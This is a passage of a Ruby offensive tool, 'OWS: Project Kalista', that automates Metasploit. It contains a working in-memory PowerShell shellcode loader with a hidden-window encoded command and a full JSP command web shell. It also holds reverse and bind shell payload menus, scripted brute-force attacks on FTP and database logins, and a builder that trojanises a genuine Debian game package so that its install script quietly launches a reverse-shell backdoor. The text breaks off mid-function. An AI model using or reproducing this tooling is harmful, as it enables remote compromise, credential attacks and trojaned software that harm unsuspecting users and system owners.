#!/usr/bin/env ruby
    #
    # OWS: Project Kalista
    # A Genral Kali & MSF Assistant Tool
    # By: Hood3dRob1n
    #
     
    ############# EDITS HERE ###################
    MSFPATH='/usr/share/metasploit-framework'  #
    KEIMPX='/root/fun/keimpx/'                 #
    TMP='/tmp'                                 #
    ############# STOP EDITS ###################
     
    #
    require 'base64'
    require 'fileutils'
    require 'optparse'
    require 'uri'
    require 'webrick'
    #
    require 'rubygems'
    require 'readline' #Ruby Readline (rb-readline)
    #
     
    #Trap interupts so we exit cleanly, don't freak out....
    trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, shutting scanner down now....."; if File.exists?("#{Dir.pwd}/msfassist.rc") then FileUtils.rm("#{Dir.pwd}/msfassist.rc") end; exit; }
     
    #banner
    def banner
            puts
            puts "OWS: Project Kalista"
            puts "By: Hood3dRob1n"
    end
     
    #clear terminal
    def cls
            system('clear') # posix style clear
    end
     
    # Execute commands safely, result is returned as array
    def commandz(foo)
            bar = IO.popen("#{foo}")
            foobar = bar.readlines
            return foobar
    end
     
    #Execute commands in separate process in standalone X-window :)
    def fireNforget(command)
            #Spawn our connection in a separate terminal cause its nicer that way!!!!!
            pid = Process.fork
            if pid.nil?
                    # In child
                    sleep(1) #dramatic pause :p
                    exec "#{command}" #This can now run in its own process thread and we dont have to wait for it
            else
                    # In parent, detach the child process
                    Process.detach(pid)
            end
    end
     
    #Preps and Builds our PowerShell Command to run our payload in memory upon execution on target.....
    def powershell_builder(venomstring)
            # venomstring should be the arguments needed for msfvenom to build the base payload/shellcode ('-p <payload> LHOST=<ip> LPORT=<port>'
            shellcode="#{`#{MSFPATH}/msfvenom #{venomstring} -b \\x00`}".gsub(";", "").gsub(" ", "").gsub("+", "").gsub('"', "").gsub("\n", "").gsub('buf=','').strip.gsub('\\',',0').sub(',', '')
            #       => yields a variable holding our escapped shellcode with ',' between each char.....
     
            puts "Converting Base ShellCode to PowerShell friendly format....."
            # Borrowed from one of several appearances across the many Python written scripts :p
            ps_base = "$code = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };"
                    # => Our base PowerShell wrapper to get the job done now in var
     
            ps_base_cmd = ps_base.sub('%s', shellcode)
                    # => place our shellcode in the Python placeholder :p
     
            #Prep it for final stages and put in funky ps format....
            ps_cmd_prepped=String.new
            ps_base_cmd.scan(/./) {|char| ps_cmd_prepped += char + "\x00" }
     
            # Base64 Encode our Payload so it is primed & ready for PowerShell usage
            stager = Base64.encode64("#{ps_cmd_prepped}")
     
            #The magic is now ready!
            ps_cmd = 'powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand ' + stager.gsub("\n", '')
            return ps_cmd
    end
     
    #Build Simple JSP Web Shell
    def simple_jsp_shell
            puts "Creating base JSP Payload using simple JSP Web Shell......"
            jsp_shell = '<%@ page import="java.util.*,java.io.*"%>
    <%
    %>
    <HTML><BODY>
    Commands with JSP
    <FORM METHOD="GET" NAME="myform" ACTION="">
    <INPUT TYPE="text" NAME="cmd">
    <INPUT TYPE="submit" VALUE="Send">
    </FORM>
    <pre>
    <%
    if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
    }
    %>
    </pre>
    </BODY></HTML>'
     
            f=File.open("#{TMP}/warbuilder/cmd.jsp", 'w')
            f.puts jsp_shell
            f.close
    end
     
    #Build MSF Reverse JSP Web Shell
    def reverse_jsp_shell(ip, port)
            puts "Creating base JSP Payload using java/jsp_shell_reverse_tcp LHOST=#{ip} LPORT=#{port}......"
            system("#{MSFPATH}/msfvenom -p java/jsp_shell_reverse_tcp LHOST=#{ip} LPORT=#{port} -f raw > #{TMP}/warbuilder/cmd.jsp")
    end
     
    #Build MSF BIND JSP Web Shell
    def bind_jsp_shell(port)
            puts "Creating base JSP Payload using java/jsp_shell_bind_tcp LPORT=#{port}......"
            system("#{MSFPATH}/msfvenom -p java/jsp_shell_bind_tcp LPORT=#{port} -f raw > #{TMP}/warbuilder/cmd.jsp")
    end
     
    #Needed WEB-INF/ & web.xml file
    def inf_build
            if Dir.exists?("#{TMP}/warbuilder/WEB-INF")
                    FileUtils.rm_r("#{TMP}/warbuilder/WEB-INF")
                    Dir.mkdir("#{TMP}/warbuilder/WEB-INF")
            else
                    Dir.mkdir("#{TMP}/warbuilder/WEB-INF")
            end
            web_inf_xml = '<?xml version="1.0" ?>
    <web-app xmlns="http://java.sun.com/xml/ns/j2ee"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
    http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
    version="2.4">
    <servlet>
    <servlet-name>PwnSauce</servlet-name>
    <jsp-file>/cmd.jsp</jsp-file>
    </servlet>
    </web-app>'
     
            f=File.open("#{TMP}/warbuilder/WEB-INF/web.xml", 'w')
            f.puts web_inf_xml
            f.close
    end
     
    #Function/Menu to run some of the common login bruteforcers & hash cracker routines
    def crackers_N_bruters
            puts "Please select option to run: "
            puts "c) Clear Terminal"
            puts "b) Back to Main Menu"
            puts "x) Exit Completely"
            puts "0) Anonymous FTP Login Scanner"
            puts "1) FTP Login Scanner"
            puts "2) MySQL Login Scanner"
            puts "3) MS-SQL Login Scanner"
            puts "4) PostgreSQL Login Scanner"
            puts
     
            prompt = "(Login Assistant)> "
            while line = Readline.readline("#{prompt}", true)
                    cmd = line.chomp
                    case cmd
                            when /^c$|^clear$/i
                                    cls
                                    banner
                                    exploit_builder
                            when /^back$|^b$/i
                                    cls
                                    banner
                                    main_menu
                            when /^exit$|^quit$|^x$/i
                                    puts
                                    puts "OK, exiting now...."
                                    puts
                                    if File.exists?("#{Dir.pwd}/msfassist.rc") then FileUtils.rm("#{Dir.pwd}/msfassist.rc") end;
                                    exit 69;
                            when '0'
                                    puts "Anonymous FTP Login Check Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Use Standard FTP Port of 21 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide FTP Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='21'
                                    end
     
                                    puts "Please provide Username (sa): "
                                    pgUser=gets.chomp
                                    puts
     
                                    puts "Please provide Password: "
                                    pgPass=gets.chomp
                                    puts
     
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use scanner/ftp/anonymous"
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
     
                                    puts "Launching MSF FTP Anonymous Login Check Scanner against #{zIP} in a new x-window....."
                                    f.puts "set THREADS 10"
                                    f.puts 'run'
                                    f.close
                                    anonftp="xterm -title 'MSF FTP Anonymous Login Check Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(anonftp)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '1'
                                    puts "FTP Login Check Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "Use Standard FTP Port of 21 (Y/N)?"
                                    answer=gets.chomp
                                    puts
                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                            puts "Provide FTP Port: "
                                            zPORT=gets.chomp
                                            puts
                                    else
                                            zPORT='21'
                                    end
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use auxiliary/scanner/ftp/ftp_login"
                                    f.puts "set RHOSTS #{zIP}"
                                    f.puts "set RPORT #{zPORT}"
                                    done=0
                                    while(true)
                                            puts "Select how to Scan for Logins: "
                                            puts "1) Single User/Pass Combo across IP"
                                            puts "2) User & Password Files for Bruteforce Scanning IP"
                                            answer=gets.chomp
                                            if answer.to_i == 1
                                                    puts "Please provide Username (sa): "
                                                    pgUser=gets.chomp
                                                    puts
                                                    puts "Please provide Password: "
                                                    pgPass=gets.chomp
                                                    puts
     
                                                    f.puts "set USERNAME #{pgUser}"
                                                    f.puts "set PASSWORD #{pgPass}"
                                                    done=1
                                                    break
                                            elsif answer.to_i == 2
                                                    while(true)
                                                            puts "Location of Password File to use: "
                                                            passfile=gets.chomp
                                                            puts
                                                            if File.exists?(passfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
                                                    while(true)
                                                            puts "Location of Username File to use: "
                                                            userfile=gets.chomp
                                                            puts
                                                            if File.exists?(userfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
     
                                                    f.puts "set USER_FILE #{userfile}"
                                                    f.puts "set PASS_FILE #{passfile}"
                                                    done=1
                                                    break
                                            else
                                                    puts "Please choose a valid option!"
                                            end
                                            if done.to_i > 0
                                                    puts "Do you want to try blank passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set BLANK_PASSWORDS false"
                                                    end
     
                                                    puts "Do you want to try username as passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set USER_AS_PASS false"
                                                    end
                                                    break
                                            end
                                    end
                                    puts "Launching MSF FTP Login Check Scanner against #{zIP} in a new x-window....."
                                    f.puts "set THREADS 10"
                                    f.puts 'run'
                                    f.close
                                    xftp="xterm -title 'MSF FTP Login Check Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(xftp)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '2'
                                    puts "MySQL Login Check Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use scanner/mysql/mysql_login"
                                    f.puts "set RHOSTS #{zIP}"
                                    done=0
                                    while(true)
                                            puts "Select how to Scan for Logins: "
                                            puts "1) Single User/Pass Combo across IP"
                                            puts "2) User & Password Files for Bruteforce Scanning IP"
                                            answer=gets.chomp
                                            if answer.to_i == 1
                                                    puts "Please provide Username (sa): "
                                                    pgUser=gets.chomp
                                                    puts
                                                    puts "Please provide Password: "
                                                    pgPass=gets.chomp
                                                    puts
     
                                                    f.puts "set USERNAME #{pgUser}"
                                                    f.puts "set PASSWORD #{pgPass}"
                                                    done=1
                                                    break
                                            elsif answer.to_i == 2
                                                    while(true)
                                                            puts "Location of Password File to use: "
                                                            passfile=gets.chomp
                                                            puts
                                                            if File.exists?(passfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
                                                    while(true)
                                                            puts "Location of Username File to use: "
                                                            userfile=gets.chomp
                                                            puts
                                                            if File.exists?(userfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
     
                                                    f.puts "set USER_FILE #{userfile}"
                                                    f.puts "set PASS_FILE #{passfile}"
                                                    done=1
                                                    break
                                            else
                                                    puts "Please choose a valid option!"
                                            end
                                            if done.to_i > 0
                                                    puts "Do you want to try blank passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set BLANK_PASSWORDS false"
                                                    end
     
                                                    puts "Do you want to try username as passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set USER_AS_PASS false"
                                                    end
                                                    break
                                            end
                                    end
                                    puts "Launching MSF MySQL Login Check Scanner against #{zIP} in a new x-window....."
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    mssql="xterm -title 'MSF MySQL Login Check Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(mssql)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '3'
                                    puts "MS-SQL Login Check Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use auxiliary/scanner/mssql/mssql_login"
                                    f.puts "set RHOSTS #{zIP}"
                                    done=0
                                    while(true)
                                            puts "Select how to Scan for Logins: "
                                            puts "1) Single User/Pass Combo across IP"
                                            puts "2) User & Password Files for Bruteforce Scanning IP"
                                            answer=gets.chomp
                                            if answer.to_i == 1
                                                    puts "Please provide Username (sa): "
                                                    pgUser=gets.chomp
                                                    puts
                                                    puts "Please provide Password: "
                                                    pgPass=gets.chomp
                                                    puts
     
                                                    f.puts "set USERNAME #{pgUser}"
                                                    f.puts "set PASSWORD #{pgPass}"
                                                    done=1
                                                    break
                                            elsif answer.to_i == 2
                                                    while(true)
                                                            puts "Location of Password File to use: "
                                                            passfile=gets.chomp
                                                            puts
                                                            if File.exists?(passfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
                                                    while(true)
                                                            puts "Location of Username File to use: "
                                                            userfile=gets.chomp
                                                            puts
                                                            if File.exists?(userfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
     
                                                    f.puts "set USER_FILE #{userfile}"
                                                    f.puts "set PASS_FILE #{passfile}"
                                                    done=1
                                                    break
                                            else
                                                    puts "Please choose a valid option!"
                                            end
                                            if done.to_i > 0
                                                    puts "Do you want to try blank passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set BLANK_PASSWORDS false"
                                                    end
     
                                                    puts "Do you want to try username as passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set USER_AS_PASS false"
                                                    end
                                                    break
                                            end
                                    end
                                    puts "Launching MSF MS-SQL Login Check Scanner against #{zIP} in a new x-window....."
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    mssql="xterm -title 'MSF MS-SQL Login Check Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(mssql)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            when '4'
                                    puts "PostgreSQL Login Check Scanner"
                                    puts "Target IP: "
                                    zIP=gets.chomp
                                    puts
                                    rcfile="#{Dir.pwd}/msfassist.rc"
                                    f=File.open(rcfile, 'w')
                                    f.puts "use auxiliary/scanner/postgres/postgres_login"
                                    f.puts "set RHOSTS #{zIP}"
                                    done=0
                                    while(true)
                                            puts "Select how to Scan for Logins: "
                                            puts "1) Single User/Pass Combo across IP"
                                            puts "2) User & Password Files for Bruteforce Scanning IP"
                                            answer=gets.chomp
                                            if answer.to_i == 1
                                                    puts "Please provide Username: "
                                                    pgUser=gets.chomp
                                                    puts
                                                    puts "Please provide Password: "
                                                    pgPass=gets.chomp
                                                    puts
     
                                                    f.puts "set USERNAME #{pgUser}"
                                                    f.puts "set PASSWORD #{pgPass}"
                                                    done=1
                                                    break
                                            elsif answer.to_i == 2
                                                    while(true)
                                                            puts "Location of Password File to use: "
                                                            passfile=gets.chomp
                                                            puts
                                                            if File.exists?(passfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
                                                    while(true)
                                                            puts "Location of Username File to use: "
                                                            userfile=gets.chomp
                                                            puts
                                                            if File.exists?(userfile)
                                                                    break
                                                            else
                                                                    puts "Can't find file, please check path or permissions and try again....\n\n"
                                                            end
                                                    end
     
                                                    f.puts "set USER_FILE #{userfile}"
                                                    f.puts "set PASS_FILE #{passfile}"
                                                    done=1
                                                    break
                                            else
                                                    puts "Please choose a valid option!"
                                            end
                                            if done.to_i > 0
                                                    puts "Do you want to try blank passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set BLANK_PASSWORDS false"
                                                    end
     
                                                    puts "Do you want to try username as passwords (Y/N)?"
                                                    answer=gets.chomp
                                                    if answer.upcase == 'N' or answer.upcase == 'NO'
                                                            f.puts "set USER_AS_PASS false"
                                                    end
                                                    break
                                            end
                                    end
                                    puts "Launching MSF PostgreSQL Login Check Scanner against #{zIP} in a new x-window....."
                                    f.puts "set THREADS 5"
                                    f.puts 'run'
                                    f.close
                                    pgsql="xterm -title 'MSF PostgreSQL Login Check Scanner #{@xcount}' -font -*-fixed-medium-r-*-*-18-*-*-*-*-*-iso8859-* -e \"bash -c '#{MSFPATH}/msfconsole -r #{rcfile}'\""
                                    fireNforget(pgsql)
                                    puts
                                    @xcount = @xcount.to_i + 1
                                    cls
                                    banner
                                    exploit_builder
                            else
                                    puts
                                    puts "Oops, Didn't quite understand that one!"
                                    puts "Please try again....."
                                    puts
                                    exploit_builder
                            end
            end
    end
     
    #Small function to help select the actual payload to use
    def payload_selector(mode)
            # 1=Listerner Mode, 2-Exploit Mode, 3=Payload Builder
            winblowz = { '1' => 'windows/meterpreter/reverse_tcp', '2' => 'windows/x64/meterpreter/reverse_tcp', '3' => 'windows/shell/reverse_tcp', '4' => 'windows/x64/shell/reverse_tcp', '5' => 'windows/vncinject/reverse_tcp', '6' => 'windows/x64/vncinject/reverse_tcp', '7' => 'windows/dllinject/reverse_tcp', '8' => 'windows/dllinject/reverse_http', '9' => 'windows/shell/reverse_http', '10' => 'windows/meterpreter/reverse_http', '11' => 'windows/meterpreter/reverse_https', '12' => 'cmd/windows/reverse_perl', '13' => 'cmd/windows/reverse_ruby', '14' => 'generic/windows/reverse_shell', '15' => 'generic/reverse_shell' }
     
            tux = { '1' => 'linux/x86/meterpreter/reverse_tcp', '2' => 'linux/x64/shell/reverse_tcp', '3' => 'linux/x86/shell/reverse_tcp', '4' => 'linux/x64/shell_reverse_tcp', '5' => 'linux/x86/shell_reverse_tcp', '6' => 'aix/ppc/shell_reverse_tcp', '7' => 'bsd/sparc/shell_reverse_tcp', '8' => 'bsd/x86/shell/reverse_tcp', '9' => 'solaris/x86/shell_reverse_tcp', '10' => 'solaris/sparc/shell_reverse_tcp', '11' => 'cmd/unix/reverse', '12' => 'cmd/unix/reverse_bash', '13' => 'cmd/unix/reverse_netcat', '14' => 'cmd/unix/reverse_perl', '15' => 'cmd/unix/reverse_python', '16' => 'cmd/unix/reverse_ruby', '17' => 'generic/shell_reverse_tcp', '18' => 'generic/reverse_shell' }
     
            genrev = { '1' => 'java/meterpreter/reverse_tcp', '2' => 'java/shell/reverse_tcp', '3' => 'java/shell_reverse_tcp', '4' => 'php/meterpreter/reverse_tcp', '5' => 'php/reverse_perl', '6' => 'php/reverse_php', '7' => 'php/shell_findsock', '8' => 'python/shell_reverse_tcp_ssl', '9' => 'ruby/shell_reverse_tcp', '10' => 'generic/reverse_shell' }
     
            binder = { '1' => 'windows/meterpreter/bind_tcp', '2' => 'windows/x64/meterpreter/bind_tcp', '3' => 'windows/x64/shell/bind_tcp', '4' => 'windows/x64/shell/bind_tcp', '5' => 'linux/x86/meterpreter/bind_tcp', '6' => 'linux/x86/shell/bind_tcp', '7' => 'linux/x64/shell/bind_tcp', '8' => 'aix/ppc/shell_bind_tcp', '9' => 'bsd/x86/shell/bind_tcp', '10' => 'solaris/x86/shell_bind_tcp', '11' => 'solaris/sparc/shell_bind_tcp', '12' => 'java/shell/bind_tcp', '13' => 'java/meterpreter/bind_tcp', '14' => 'php/meterpreter/bind_tcp', '15' => 'generic/bind_shell' }
     
            while(true)
                    puts "Select Type of Payload: "
                    puts "1) Bind Shell"
                    puts "2) Reverse Shell"
                    type=gets.chomp
                    puts
                    if type == '2' #REVERSE SHELL
                            while(true)
                                    puts "Select the Payload Category: "
                                    puts "1) Windows"
                                    puts "2) Linux"
                                    puts "3) OTHER"
                                    os=gets.chomp
                                    puts
                                    puts "Select Payload: "
                                    if os == '1'
                                            while(true)
                                                    if mode.to_i == 1
                                                            winblowz.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
                                                            sizer=winblowz.size
                                                    else
                                                            winblowz.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}") unless value == 'generic/reverse_shell' }
                                                            sizer=winblowz.size - 1
                                                    end
                                                    answer=gets.chomp
                                                    puts
                                                    if answer.to_i == 0 or answer.to_i > sizer.to_i
                                                            puts
                                                            puts "Please Enter a Valid Option!"
                                                            puts
                                                    else
                                                            payload = winblowz[answer]
                                                            break
                                                    end
                                            end
                                            break
                                    elsif os =='2'
                                            while(true)
                                                    if mode.to_i == 1
                                                            tux.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
                                                            sizer=tux.size
                                                    else
                                                            tux.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}") unless value == 'generic/reverse_shell' }
                                                            sizer=tux.size - 1
                                                    end
                                                    answer=gets.chomp
                                                    puts
                                                    if answer.to_i == 0 or answer.to_i > sizer.to_i
                                                            puts
                                                            puts "Please Enter a Valid Option!"
                                                            puts
                                                    else
                                                            payload = tux[answer]
                                                            break
                                                    end
                                            end
                                            break
                                    elsif os == '3'
                                            while(true)
                                                    if mode.to_i == 1
                                                            genrev.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
                                                            sizer=genrev.size
                                                    else
                                                            genrev.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}") unless value == 'generic/reverse_shell' }
                                                            sizer=genrev.size - 1
                                                    end
                                                    answer=gets.chomp
                                                    puts
                                                    if answer.to_i == 0 or answer.to_i > sizer.to_i
                                                            puts
                                                            puts "Please Enter a Valid Option!"
                                                            puts
                                                    else
                                                            payload = genrev[answer]
                                                            break
                                                    end
                                            end
                                            break
                                    end
                            end
                            break
                    elsif type == '1' #BIND SHELL
                            while(true)
                                    puts "Select Payload: "
                                    if mode.to_i == 1
                                            binder.each { |key,value| puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}" }
                                            sizer=binder.size
                                    else
                                            binder.each { |key,value| (puts (key.to_i < 10) ? "#{key})  #{value}" : "#{key}) #{value}") unless value == 'generic/bind_shell' }
                                            sizer=binder.size - 1
                                    end
                                    answer=gets.chomp
                                    puts
                                    if answer.to_i == 0 or answer.to_i > sizer.to_i
                                            puts
                                            puts "Please Enter a Valid Option!"
                                            puts
                                    else
                                            payload = binder[answer]
                                            break
                                    end
                            end
                            break
                    end
            end
            return payload
    end
     
    #Payload Builder
    def payload_builder
            # TYPES OF PAYLOAD TO BUILD:
            # shellcode generator
            # xor obfuscated executable
            puts "Please select option to run: "
            puts "c)  Clear Terminal"
            puts "b)  Back to Main Menu"
            puts "x)  Exit Completely"
            puts "0)  Linux ELF Executable"
            puts "1)  Linux DEB Installer Package, using: Tint (This is Not Tetris)"
            puts "2)  ASP, JSP & PHP Web Payloads"
            puts "3)  Windows EXE Executable"
            puts "4)  Windows PDF Embedded Payload"
            puts "5)  Windows Download & Execute Payload"
            puts "6)  Windows PowerShell Payloads"
            puts "7)  WAR (Web-Archive) Payloads"
            puts
            prompt = "(Payload Assistant)> "
            while line = Readline.readline("#{prompt}", true)
                    cmd = line.chomp
                    case cmd
                            when /^c$|^clear$/i
                                    cls
                                    banner
                                    payload_builder
                            when /^back$|^b$/i
                                    cls
                                    banner
                                    main_menu
                            when /^exit$|^quit$|^x$/i
                                    puts
                                    puts "OK, exiting now...."
                                    puts
                                    if File.exists?("#{Dir.pwd}/msfassist.rc") then FileUtils.rm("#{Dir.pwd}/msfassist.rc") end;
                                    exit 69;
                            when '0'
                                    puts
                                    puts "Select Build Type: "
                                    puts "1) x86"
                                    puts "2) x86_64"
                                    answer=gets.chomp
                                    puts
                                    if answer == '2'
                                            payload='linux/x64/shell/reverse_tcp'
                                    else
                                            payload='linux/x86/meterpreter/reverse_tcp'
                                    end
     
                                    puts "What IP to use for reverse payload: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "What PORT to listen on for reverse payload: "
                                    zPORT=gets.chomp
                                    puts
                                    cls
                                    banner
                                    puts
                                    puts "Creating Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......"
                                    system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -f elf > #{Dir.pwd}/evil_elf")
                                    sleep(1)
                                    puts "Final Backdoor ELF Executable is ready to go!"
                                    puts "You can find it here: #{Dir.pwd}/evil_elf"
                                    puts "May the Force be with you..."
                                    puts
                                    puts
                                    payload_builder
                                   
                            when '1'
                                    puts "Launching Linux Backdoor Payload Builder....."
                                    if File.exists?('/tmp/nothing2seehere/')
                                            FileUtils.rm_r('/tmp/nothing2seehere/')
                                    end
                                    Dir.mkdir('/tmp/nothing2seehere/')
                                    Dir.mkdir('/tmp/nothing2seehere/extract') #Storage for us to use and extract some needed files for cloning
                                    Dir.mkdir('/tmp/nothing2seehere/build') #Create directory to work and build final payload from
                                    Dir.mkdir('/tmp/nothing2seehere/build/DEBIAN') #Required for our final build
                                    sleep(1)
     
                                    puts "Select Build Type: "
                                    puts "1) x86"
                                    puts "2) x86_64"
                                    answer=gets.chomp
                                    puts
                                    puts "Trying to grab the latest sources for Tint now....."
                                    if answer == '2'
                                            payload='linux/x64/shell/reverse_tcp'
                                            Dir.chdir('/tmp/nothing2seehere/extract') do
                                                    system("wget http://ftp.us.debian.org/debian/pool/main/t/tint/tint_0.04+nmu1_amd64.deb 2> /dev/null")
                                            end
                                            confirmed='tint_0.04+nmu1_amd64.deb'
                                            type='x86_64'
                                    else
                                            payload='linux/x86/meterpreter/reverse_tcp'
                                            Dir.chdir('/tmp/nothing2seehere/extract') do
                                                    system("wget http://ftp.us.debian.org/debian/pool/main/t/tint/tint_0.04+nmu1_i386.deb 2> /dev/null")
                                            end
                                            confirmed='tint_0.04+nmu1_i386.deb'
                                            type='x86'
                                    end
     
                                    puts "What IP to use for reverse payload: "
                                    zIP=gets.chomp
                                    puts
     
                                    puts "What PORT to listen on for reverse payload: "
                                    zPORT=gets.chomp
                                    puts
     
                                    puts "Creating Base Payload using #{payload} LHOST=#{zIP} LPORT=#{zPORT}......"
                                    system("#{MSFPATH}/msfvenom -p #{payload} LHOST=#{zIP} LPORT=#{zPORT} -f elf > /tmp/nothing2seehere/evil_base")
     
                                    Dir.chdir('/tmp/nothing2seehere/extract') do
                                            system("dpkg -x #{confirmed} /tmp/nothing2seehere/build/ &>/dev/null") #Extract for re-build, without output....
                                            system("ar x #{confirmed}") # extract: x - debian-binary, x - control.tar.gz, x - data.tar.gz
                                            system('tar xf control.tar.gz') #Extract so we can re-use the control, postinst, & postrm if exists
                                            FileUtils.cp('control', '/tmp/nothing2seehere/build/DEBIAN/control') #Clone control file
                                            if File.exists?('postrm')
                                                    FileUtils.cp('postrm', '/tmp/nothing2seehere/build/DEBIAN/postrm') #Clone post cleanup file if exists
                                                    File.chmod(0775, '/tmp/nothing2seehere/build/DEBIAN/postrm')
                                            end
                                            postinst=File.open('/tmp/nothing2seehere/extract/postinst').read #We will 2 append our injection to this......
                                            #Add our injection to our postinst file....
                                            if postinst =~ /# End automatically added section/
                                                    postinst.sub!('# End automatically added section', "sudo chmod 2755 /usr/games/not_tetris && nohup /usr/games/not_tetris >/dev/null 2>&1 & \n# End automatically added section") #Run payload in background with no interupt xD
                                            else
                                                    postinst += "\nsudo chmod 2755 /usr/games/not_tetris && nohup /usr/games/not_tetris >/dev/null 2>&1 &" #Run payload in background with no interupt xD
                                            end
     
                                            f = File.open('/tmp/nothing2seehere/build/DEBIAN/postinst', 'w')
                                            f.puts "#{postinst}" #Write our updated postinst file in our re-build directory
                                            f.close
                                            File.chmod(0775, '/tmp/nothing2seehere/build/DEBIAN/postinst') #chmod our postinst file (I think dpkg handles this if its not properly set but best to be safe.....
                                    end
     
